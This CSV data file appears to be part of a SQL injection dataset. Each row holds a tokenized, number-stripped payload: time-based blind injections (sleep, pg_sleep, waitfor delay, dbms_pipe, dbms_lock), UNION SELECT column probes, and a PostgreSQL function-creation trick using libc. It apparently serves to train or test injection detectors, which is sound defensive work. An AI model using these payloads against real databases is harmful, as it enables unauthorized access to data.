,language,source
311,sql,"; select dbms_pipe . receive_message ( chr ( ) | | chr ( ) | | chr ( ) | | chr ( ) , ) from dual - -"
312,sql,"' ; select dbms_pipe . receive_message ( chr ( ) | | chr ( ) | | chr ( ) | | chr ( ) , ) from dual - -"
313,sql,"' ) ; select dbms_pipe . receive_message ( chr ( ) | | chr ( ) | | chr ( ) | | chr ( ) , ) from dual - -"
314,sql,) and sleep ( ) - -
315,sql,) and sleep ( ) and ( =
316,sql,) ) and sleep ( ) and ( ( =
317,sql,) ) ) and sleep ( ) and ( ( ( =
318,sql,% ' ) ) and sleep ( ) and ( ( ' % ' = '
319,sql,% ' and sleep ( ) and ' % ' = '
320,sql,"% "" and sleep ( ) and % "" = "" """
321,sql,) and sleep ( ) #
322,sql,) ) and sleep ( ) #
323,sql,) ) ) and sleep ( ) #
324,sql,and sleep ( ) #
325,sql,' and sleep ( ) #
326,sql,' ) and sleep ( ) #
327,sql,' ) ) and sleep ( ) #
328,sql,' ) ) ) and sleep ( ) #
329,sql,""" ) and sleep ( ) #"
330,sql,""" ) ) and sleep ( ) #"
331,sql,""" and sleep ( ) #"
332,sql,% ' ) and sleep ( ) #
333,sql,% ' ) ) and sleep ( ) #
334,sql,% ' and sleep ( ) #
335,sql,"% "" and sleep ( ) #"
336,sql,) and ( select * from ( select ( sleep ( ) ) ) uygz ) - -
337,sql,) and ( select * from ( select ( sleep ( ) ) ) uygz ) and ( =
338,sql,) ) and ( select * from ( select ( sleep ( ) ) ) uygz ) and ( ( =
339,sql,) ) ) and ( select * from ( select ( sleep ( ) ) ) uygz ) and ( ( ( =
340,sql,"% "" and ( select * from ( select ( sleep ( ) ) ) uygz ) and % "" = "" """
341,sql,) and ( select * from ( select ( sleep ( ) ) ) pjbf ) #
342,sql,) ) and ( select * from ( select ( sleep ( ) ) ) pjbf ) #
343,sql,) ) ) and ( select * from ( select ( sleep ( ) ) ) pjbf ) #
344,sql,and ( select * from ( select ( sleep ( ) ) ) pjbf ) #
345,sql,' and ( select * from ( select ( sleep ( ) ) ) pjbf ) #
346,sql,' ) and ( select * from ( select ( sleep ( ) ) ) pjbf ) #
347,sql,' ) ) and ( select * from ( select ( sleep ( ) ) ) pjbf ) #
348,sql,' ) ) ) and ( select * from ( select ( sleep ( ) ) ) pjbf ) #
349,sql,""" ) and ( select * from ( select ( sleep ( ) ) ) pjbf ) #"
350,sql,""" ) ) and ( select * from ( select ( sleep ( ) ) ) pjbf ) #"
351,sql,""" and ( select * from ( select ( sleep ( ) ) ) pjbf ) #"
352,sql,% ' ) and ( select * from ( select ( sleep ( ) ) ) pjbf ) #
353,sql,% ' ) ) and ( select * from ( select ( sleep ( ) ) ) pjbf ) #
354,sql,% ' and ( select * from ( select ( sleep ( ) ) ) pjbf ) #
355,sql,"% "" and ( select * from ( select ( sleep ( ) ) ) pjbf ) #"
356,sql,) rlike sleep ( ) - -
357,sql,) rlike sleep ( ) and ( =
358,sql,) ) rlike sleep ( ) and ( ( =
359,sql,) ) ) rlike sleep ( ) and ( ( ( =
360,sql,rlike sleep ( )
361,sql,rlike sleep ( ) - -
362,sql,rlike sleep ( ) #
363,sql,' rlike sleep ( ) - -
364,sql,' ) rlike sleep ( ) and ( ' wpgo ' = '
365,sql,% ' rlike sleep ( ) and ' % ' = '
366,sql,"% "" rlike sleep ( ) and % "" = "" """
367,sql,) rlike ( select * from ( select ( sleep ( ) ) ) ufpp ) - -
368,sql,) rlike ( select * from ( select ( sleep ( ) ) ) ufpp ) and ( =
369,sql,) ) rlike ( select * from ( select ( sleep ( ) ) ) ufpp ) and ( ( =
370,sql,) ) ) rlike ( select * from ( select ( sleep ( ) ) ) ufpp ) and ( ( ( =
371,sql,rlike ( select * from ( select ( sleep ( ) ) ) ufpp )
372,sql,rlike ( select * from ( select ( sleep ( ) ) ) ufpp ) - -
373,sql,rlike ( select * from ( select ( sleep ( ) ) ) ufpp ) #
374,sql,' rlike ( select * from ( select ( sleep ( ) ) ) ufpp ) - -
375,sql,' ) rlike ( select * from ( select ( sleep ( ) ) ) ufpp ) and ( ' fvks ' = '
376,sql,' ) ) rlike ( select * from ( select ( sleep ( ) ) ) ufpp ) and ( ( ' zmfd ' = '
377,sql,' ) ) ) rlike ( select * from ( select ( sleep ( ) ) ) ufpp ) and ( ( ( ' weqg ' = '
378,sql,"% "" rlike ( select * from ( select ( sleep ( ) ) ) ufpp ) and % "" = "" """
379,sql,") and elt ( = , sleep ( ) ) - -"
380,sql,") and elt ( = , sleep ( ) ) and ( ="
381,sql,") ) and elt ( = , sleep ( ) ) and ( ( ="
382,sql,") ) ) and elt ( = , sleep ( ) ) and ( ( ( ="
383,sql,"and elt ( = , sleep ( ) )"
384,sql,"and elt ( = , sleep ( ) ) - -"
385,sql,"and elt ( = , sleep ( ) ) #"
386,sql,"' and elt ( = , sleep ( ) ) - -"
387,sql,"' ) and elt ( = , sleep ( ) ) and ( ' ekia ' = '"
388,sql,"' ) ) and elt ( = , sleep ( ) ) and ( ( ' szdw ' = '"
389,sql,"' ) ) ) and elt ( = , sleep ( ) ) and ( ( ( ' wyax ' = '"
390,sql,"' and elt ( = , sleep ( ) ) and ' yjnn ' = '"
391,sql,"' ) and elt ( = , sleep ( ) ) and ( ' kswm ' like '"
392,sql,"' ) ) and elt ( = , sleep ( ) ) and ( ( ' ixaq ' like '"
393,sql,"' and elt ( = , sleep ( ) ) and ' ndhz ' like '"
394,sql,""" ) and elt ( = , sleep ( ) ) and ( umlc "" = "" """
395,sql,""" ) ) and elt ( = , sleep ( ) ) and ( ( pvhx "" = "" """
396,sql,""" and elt ( = , sleep ( ) ) and wesk "" = "" """
397,sql,""" ) and elt ( = , sleep ( ) ) and ( kdqg "" like "" """
398,sql,""" and elt ( = , sleep ( ) ) and fane "" like "" """
399,sql,"% ' ) and elt ( = , sleep ( ) ) and ( ' % ' = '"
400,sql,"% ' ) ) and elt ( = , sleep ( ) ) and ( ( ' % ' = '"
401,sql,"% ' and elt ( = , sleep ( ) ) and ' % ' = '"
402,sql,"% "" and elt ( = , sleep ( ) ) and % "" = "" """
403,sql,) and = ( select from pg_sleep ( ) ) - -
404,sql,) and = ( select from pg_sleep ( ) ) and ( =
405,sql,) ) and = ( select from pg_sleep ( ) ) and ( ( =
406,sql,) ) ) and = ( select from pg_sleep ( ) ) and ( ( ( =
407,sql,and = ( select from pg_sleep ( ) )
408,sql,and = ( select from pg_sleep ( ) ) - -
409,sql,and = ( select from pg_sleep ( ) ) #
410,sql,' and = ( select from pg_sleep ( ) ) - -
411,sql,' ) and = ( select from pg_sleep ( ) ) and ( ' yvxe ' = '
412,sql,' ) ) and = ( select from pg_sleep ( ) ) and ( ( ' ccob ' = '
413,sql,' ) ) ) and = ( select from pg_sleep ( ) ) and ( ( ( ' lvib ' = '
414,sql,' and = ( select from pg_sleep ( ) ) and ' szzi ' = '
415,sql,' ) and = ( select from pg_sleep ( ) ) and ( ' kmuo ' like '
416,sql,' ) ) and = ( select from pg_sleep ( ) ) and ( ( ' dlrn ' like '
417,sql,' and = ( select from pg_sleep ( ) ) and ' skza ' like '
418,sql,""" ) and = ( select from pg_sleep ( ) ) and ( osdg "" = "" """
419,sql,""" ) ) and = ( select from pg_sleep ( ) ) and ( ( azge "" = "" """
420,sql,""" and = ( select from pg_sleep ( ) ) and jwhp "" = "" """
421,sql,""" ) and = ( select from pg_sleep ( ) ) and ( avxz "" like "" """
422,sql,""" and = ( select from pg_sleep ( ) ) and cktp "" like "" """
423,sql,% ' ) and = ( select from pg_sleep ( ) ) and ( ' % ' = '
424,sql,% ' ) ) and = ( select from pg_sleep ( ) ) and ( ( ' % ' = '
425,sql,% ' and = ( select from pg_sleep ( ) ) and ' % ' = '
426,sql,"% "" and = ( select from pg_sleep ( ) ) and % "" = "" """
427,sql,) waitfor delay ' : : ' - -
428,sql,) waitfor delay ' : : ' and ( =
429,sql,) ) waitfor delay ' : : ' and ( ( =
430,sql,) ) ) waitfor delay ' : : ' and ( ( ( =
431,sql,waitfor delay ' : : '
432,sql,waitfor delay ' : : ' - -
433,sql,waitfor delay ' : : ' #
434,sql,' waitfor delay ' : : ' - -
435,sql,' ) waitfor delay ' : : ' and ( ' shit ' = '
436,sql,' ) ) waitfor delay ' : : ' and ( ( ' iuud ' = '
437,sql,' ) ) ) waitfor delay ' : : ' and ( ( ( ' ghrg ' = '
438,sql,' waitfor delay ' : : ' and ' yrpr ' = '
439,sql,' ) waitfor delay ' : : ' and ( ' rvvv ' like '
440,sql,' ) ) waitfor delay ' : : ' and ( ( ' tpcy ' like '
441,sql,' waitfor delay ' : : ' and ' hqfw ' like '
442,sql,""" ) waitfor delay ' : : ' and ( bqdq "" = "" """
443,sql,""" ) ) waitfor delay ' : : ' and ( ( twxh "" = "" """
444,sql,""" waitfor delay ' : : ' and ippm "" = "" """
445,sql,""" ) waitfor delay ' : : ' and ( rgum "" like "" """
446,sql,""" waitfor delay ' : : ' and bcgp "" like "" """
447,sql,% ' ) waitfor delay ' : : ' and ( ' % ' = '
448,sql,% ' ) ) waitfor delay ' : : ' and ( ( ' % ' = '
449,sql,% ' waitfor delay ' : : ' and ' % ' = '
450,sql,"% "" waitfor delay ' : : ' and % "" = "" """
451,sql,") and = dbms_pipe . receive_message ( chr ( ) | | chr ( ) | | chr ( ) | | chr ( ) , ) - -"
452,sql,") and = dbms_pipe . receive_message ( chr ( ) | | chr ( ) | | chr ( ) | | chr ( ) , ) and ( ="
453,sql,") ) and = dbms_pipe . receive_message ( chr ( ) | | chr ( ) | | chr ( ) | | chr ( ) , ) and ( ( ="
454,sql,") ) ) and = dbms_pipe . receive_message ( chr ( ) | | chr ( ) | | chr ( ) | | chr ( ) , ) and ( ( ( ="
455,sql,"and = dbms_pipe . receive_message ( chr ( ) | | chr ( ) | | chr ( ) | | chr ( ) , )"
456,sql,"and = dbms_pipe . receive_message ( chr ( ) | | chr ( ) | | chr ( ) | | chr ( ) , ) - -"
457,sql,"and = dbms_pipe . receive_message ( chr ( ) | | chr ( ) | | chr ( ) | | chr ( ) , ) #"
458,sql,"' and = dbms_pipe . receive_message ( chr ( ) | | chr ( ) | | chr ( ) | | chr ( ) , ) - -"
459,sql,"' ) and = dbms_pipe . receive_message ( chr ( ) | | chr ( ) | | chr ( ) | | chr ( ) , ) and ( ' utzj ' = '"
460,sql,"' ) ) and = dbms_pipe . receive_message ( chr ( ) | | chr ( ) | | chr ( ) | | chr ( ) , ) and ( ( ' zrkf ' = '"
461,sql,"' ) ) ) and = dbms_pipe . receive_message ( chr ( ) | | chr ( ) | | chr ( ) | | chr ( ) , ) and ( ( ( ' zpip ' = '"
462,sql,"' and = dbms_pipe . receive_message ( chr ( ) | | chr ( ) | | chr ( ) | | chr ( ) , ) and ' iujo ' = '"
463,sql,"' ) and = dbms_pipe . receive_message ( chr ( ) | | chr ( ) | | chr ( ) | | chr ( ) , ) and ( ' chxg ' like '"
464,sql,"' ) ) and = dbms_pipe . receive_message ( chr ( ) | | chr ( ) | | chr ( ) | | chr ( ) , ) and ( ( ' phtu ' like '"
465,sql,"' and = dbms_pipe . receive_message ( chr ( ) | | chr ( ) | | chr ( ) | | chr ( ) , ) and ' uoqn ' like '"
466,sql,""" ) and = dbms_pipe . receive_message ( chr ( ) | | chr ( ) | | chr ( ) | | chr ( ) , ) and ( cegp "" = "" """
467,sql,""" ) ) and = dbms_pipe . receive_message ( chr ( ) | | chr ( ) | | chr ( ) | | chr ( ) , ) and ( ( vzyz "" = "" """
468,sql,""" and = dbms_pipe . receive_message ( chr ( ) | | chr ( ) | | chr ( ) | | chr ( ) , ) and zzkl "" = "" """
469,sql,""" ) and = dbms_pipe . receive_message ( chr ( ) | | chr ( ) | | chr ( ) | | chr ( ) , ) and ( zyik "" like "" """
470,sql,""" and = dbms_pipe . receive_message ( chr ( ) | | chr ( ) | | chr ( ) | | chr ( ) , ) and dhcg "" like "" """
471,sql,"% ' ) and = dbms_pipe . receive_message ( chr ( ) | | chr ( ) | | chr ( ) | | chr ( ) , ) and ( ' % ' = '"
472,sql,"% ' ) ) and = dbms_pipe . receive_message ( chr ( ) | | chr ( ) | | chr ( ) | | chr ( ) , ) and ( ( ' % ' = '"
473,sql,"% ' and = dbms_pipe . receive_message ( chr ( ) | | chr ( ) | | chr ( ) | | chr ( ) , ) and ' % ' = '"
474,sql,"% "" and = dbms_pipe . receive_message ( chr ( ) | | chr ( ) | | chr ( ) | | chr ( ) , ) and % "" = "" """
475,sql,( case when ( = ) then sleep ( ) else end )
476,sql,( select * from ( select ( sleep ( ) ) ) nztg )
477,sql,( select from pg_sleep ( ) )
478,sql,begin if ( = ) then dbms_lock . sleep ( ) ; else dbms_lock . sleep ( ) ; end if ; end ;
479,sql,"( select ( case when ( = ) then dbms_pipe . receive_message ( chr ( ) | | chr ( ) | | chr ( ) | | chr ( ) , ) else end ) from dual )"
480,sql,", ( select ( case when ( = ) then sleep ( ) else end ) )"
481,sql,"' , ( select ( case when ( = ) then sleep ( ) else end ) ) - -"
482,sql,", ( select ( case when ( = ) then ( select from pg_sleep ( ) ) else / ( select ) end ) )"
483,sql,"' , ( select ( case when ( = ) then ( select from pg_sleep ( ) ) else / ( select ) end ) ) - -"
484,sql,", ( begin if ( = ) then dbms_lock . sleep ( ) ; else dbms_lock . sleep ( ) ; end if ; end ; )"
485,sql,"' , ( begin if ( = ) then dbms_lock . sleep ( ) ; else dbms_lock . sleep ( ) ; end if ; end ; ) - -"
486,sql,", ( select ( case when ( = ) then dbms_pipe . receive_message ( chr ( ) | | chr ( ) | | chr ( ) | | chr ( ) , ) else / ( select from dual ) end ) from dual )"
487,sql,"' , ( select ( case when ( = ) then dbms_pipe . receive_message ( chr ( ) | | chr ( ) | | chr ( ) | | chr ( ) , ) else / ( select from dual ) end ) from dual ) - -"
488,sql,) order by - -
489,sql,) order by - -
490,sql,- ' ) ) order by #
491,sql,- ' ) ) union all select #
492,sql,"- ' ) ) union all select , #"
493,sql,"- ' ) ) union all select , , #"
494,sql,"- ' ) ) union all select , , , #"
495,sql,"- ' ) ) union all select , , , , #"
496,sql,"- ' ) ) union all select , , , , , #"
497,sql,"- ' ) ) union all select , , , , , , #"
498,sql,"- ' ) ) union all select , , , , , , , #"
499,sql,"- ' ) ) union all select , , , , , , , , #"
500,sql,"- ' ) ) union all select , , , , , , , , , #"
501,sql,- ' order by #
502,sql,- ' union all select #
503,sql,"- ' union all select , #"
504,sql,"- ' union all select , , #"
505,sql,"- ' union all select , , , #"
506,sql,"- ' union all select , , , , #"
507,sql,"- ' union all select , , , , , #"
508,sql,"- ' union all select , , , , , , #"
509,sql,"- ' union all select , , , , , , , #"
510,sql,"- ' union all select , , , , , , , , #"
511,sql,"- ' union all select , , , , , , , , , #"
512,sql,"- "" ) order by #"
513,sql,"- "" ) union all select #"
514,sql,"- "" ) union all select , #"
515,sql,"- "" ) union all select , , #"
516,sql,"- "" ) union all select , , , #"
517,sql,"- "" ) union all select , , , , #"
518,sql,"- "" ) union all select , , , , , #"
519,sql,"- "" ) union all select , , , , , , #"
520,sql,"- "" ) union all select , , , , , , , #"
521,sql,"- "" ) union all select , , , , , , , , #"
522,sql,"- "" ) union all select , , , , , , , , , #"
523,sql,"- "" ) ) order by #"
524,sql,"- "" ) ) union all select #"
525,sql,"- "" ) ) union all select , #"
526,sql,"- "" ) ) union all select , , #"
527,sql,"- "" ) ) union all select , , , #"
528,sql,"- "" ) ) union all select , , , , #"
529,sql,"- "" ) ) union all select , , , , , #"
530,sql,"- "" ) ) union all select , , , , , , #"
531,sql,"- "" ) ) union all select , , , , , , , #"
532,sql,"- "" ) ) union all select , , , , , , , , #"
533,sql,"- "" ) ) union all select , , , , , , , , , #"
534,sql,"- "" order by #"
535,sql,"- "" union all select #"
536,sql,"- "" union all select , #"
537,sql,"- "" union all select , , #"
538,sql,"- "" union all select , , , #"
539,sql,"- "" union all select , , , , #"
540,sql,"- "" union all select , , , , , #"
541,sql,"- "" union all select , , , , , , #"
542,sql,"- "" union all select , , , , , , , #"
543,sql,"- "" union all select , , , , , , , , #"
544,sql,"- "" union all select , , , , , , , , , #"
545,sql,"- "" ) order by #"
546,sql,"- "" ) union all select #"
547,sql,"- "" ) union all select , #"
548,sql,"- "" ) union all select , , #"
549,sql,"- "" ) union all select , , , #"
550,sql,"- "" ) union all select , , , , #"
551,sql,"- "" ) union all select , , , , , #"
552,sql,"- "" ) union all select , , , , , , #"
553,sql,"- "" ) union all select , , , , , , , #"
554,sql,"- "" ) union all select , , , , , , , , #"
555,sql,"- "" ) union all select , , , , , , , , , #"
556,sql,"- "" order by #"
557,sql,"- "" union all select #"
558,sql,"- "" union all select , #"
559,sql,"- "" union all select , , #"
560,sql,"- "" union all select , , , #"
561,sql,"- "" union all select , , , , #"
562,sql,"- "" union all select , , , , , #"
563,sql,"- "" union all select , , , , , , #"
564,sql,"- "" union all select , , , , , , , #"
565,sql,"- "" union all select , , , , , , , , #"
566,sql,"- "" union all select , , , , , , , , , #"
567,sql,- % ' order by #
568,sql,""" ' ) . ( , , , ) ("
569,sql,"' kynecg < ' "" >"
570,sql,; ( select * from ( select ( sleep ( ) ) ) tqiz ) #
571,sql,' ) ; ( select * from ( select ( sleep ( ) ) ) tqiz ) #
572,sql,' ) ) ; ( select * from ( select ( sleep ( ) ) ) tqiz ) #
573,sql,' ) ) ) ; ( select * from ( select ( sleep ( ) ) ) tqiz ) #
574,sql,""" ) ; ( select * from ( select ( sleep ( ) ) ) tqiz ) #"
575,sql,""" ) ) ; ( select * from ( select ( sleep ( ) ) ) tqiz ) #"
576,sql,""" ; ( select * from ( select ( sleep ( ) ) ) tqiz ) #"
577,sql,% ' ) ; ( select * from ( select ( sleep ( ) ) ) tqiz ) #
578,sql,% ' ) ) ; ( select * from ( select ( sleep ( ) ) ) tqiz ) #
579,sql,% ' ; ( select * from ( select ( sleep ( ) ) ) tqiz ) #
580,sql,"% "" ; ( select * from ( select ( sleep ( ) ) ) tqiz ) #"
581,sql,) ; select pg_sleep ( ) - -
582,sql,' ; select pg_sleep ( ) - -
583,sql,) ) ; select pg_sleep ( ) - -
584,sql,) ) ) ; select pg_sleep ( ) - -
585,sql,; select pg_sleep ( ) - -
586,sql,' ) ; select pg_sleep ( ) - -
587,sql,' ) ) ; select pg_sleep ( ) - -
588,sql,"' ) ) ) ; create or replace function sleep ( int ) returns int as ' / lib / libc . so . ' , ' sleep ' language ' c ' strict ; select sleep ( ) - -"
589,sql,""" ) ; create or replace function sleep ( int ) returns int as ' / lib / libc . so . ' , ' sleep ' language ' c ' strict ; select sleep ( ) - -"
590,sql,""" ) ) ; create or replace function sleep ( int ) returns int as ' / lib / libc . so . ' , ' sleep ' language ' c ' strict ; select sleep ( ) - -"
591,sql,""" ; create or replace function sleep ( int ) returns int as ' / lib / libc . so . ' , ' sleep ' language ' c ' strict ; select sleep ( ) - -"
592,sql,"% ' ) ; create or replace function sleep ( int ) returns int as ' / lib / libc . so . ' , ' sleep ' language ' c ' strict ; select sleep ( ) - -"
593,sql,"% ' ) ) ; create or replace function sleep ( int ) returns int as ' / lib / libc . so . ' , ' sleep ' language ' c ' strict ; select sleep ( ) - -"
594,sql,"% ' ; create or replace function sleep ( int ) returns int as ' / lib / libc . so . ' , ' sleep ' language ' c ' strict ; select sleep ( ) - -"
595,sql,"% "" ; create or replace function sleep ( int ) returns int as ' / lib / libc . so . ' , ' sleep ' language ' c ' strict ; select sleep ( ) - -"
